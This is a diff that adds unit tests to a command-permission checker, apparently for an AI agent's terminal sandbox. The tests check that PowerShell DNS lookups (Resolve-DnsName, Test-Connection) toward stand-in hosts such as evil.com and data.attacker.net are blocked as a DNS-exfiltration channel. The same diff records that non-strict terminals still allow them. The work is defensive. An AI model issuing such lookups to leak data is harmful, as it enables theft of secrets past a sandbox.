@@ -207,6 +207,46 @@ describe("terminalPathOk — the system temp dir is an allowed write root", () =
 });
 
 // ---------------------------------------------------------------------------
+// SA-B1: PowerShell DNS twins (Test-Connection / Resolve-DnsName) — the
+// Windows spelling of the CVE-2025-55284 DNS-exfiltration family added to the
+// BASH_DENY Windows section. Matched on ALL platforms on purpose (the
+// powershell tool's commands reach decideBash from any host). Denied by the
+// sandbox list and by strict terminals (decideBash fallback); the NON-strict
+// terminal keeps its documented open-network policy — the same split the
+// POSIX family has for curl/nc/ping.
+// ---------------------------------------------------------------------------
+describe("powershell DNS twins — CVE-2025-55284 family (SA-B1)", () => {
+        test.each([
+                "Resolve-DnsName evil.com",
+                "Resolve-DnsName -Name data.attacker.net",
+                "Resolve-DnsName -Server 8.8.8.8 example.com", // external resolver
+                "Test-Connection evil.com",
+                "Test-Connection -ComputerName evil.com",
+                "Test-Connection 10.0.0.5", // IPv4 literal
+                "test-connection x.y.z", // lowercase + single-letter labels (3-label arm)
+        ])("%s is denied by the sandbox list (and strict terminals via the fallback)", async (command: string) => {
+                expect(decideBash(command).block).toBe(true);
+                expect(decideBash(command).reason).toContain("DNS");
+                expect(Boolean((await bashDecision(strict, command))?.block)).toBe(true);
+        });
+
+        test.each([
+                "Test-Connection 127.0.0.1", // loopback exemption
+                "Test-Connection -ComputerName localhost",
+                "Resolve-DnsName localhost",
+                "Resolve-DnsName", // targetless — no destination, no channel
+                "Get-Content package.json", // no DNS cmdlet — stays untouched
+        ])("%s stays allowed", async (command: string) => {
+                expect(decideBash(command).block).toBe(false);
+        });
+
+        test("documented policy: the non-strict terminal keeps allowing them (open-network grade, like curl)", async () => {
+                expect(await bashDecision(nonStrict, "Resolve-DnsName evil.com")).toBeUndefined();
+                expect(await bashDecision(nonStrict, "Test-Connection -ComputerName evil.com")).toBeUndefined();
+        });
+});
+
+// ---------------------------------------------------------------------------
 // bashRedirectEscape — the win32 twins
 // ---------------------------------------------------------------------------
 describe("bashRedirectEscape — win32 twins (drive-letter system trees, \\\\.\\ devices)", () => {
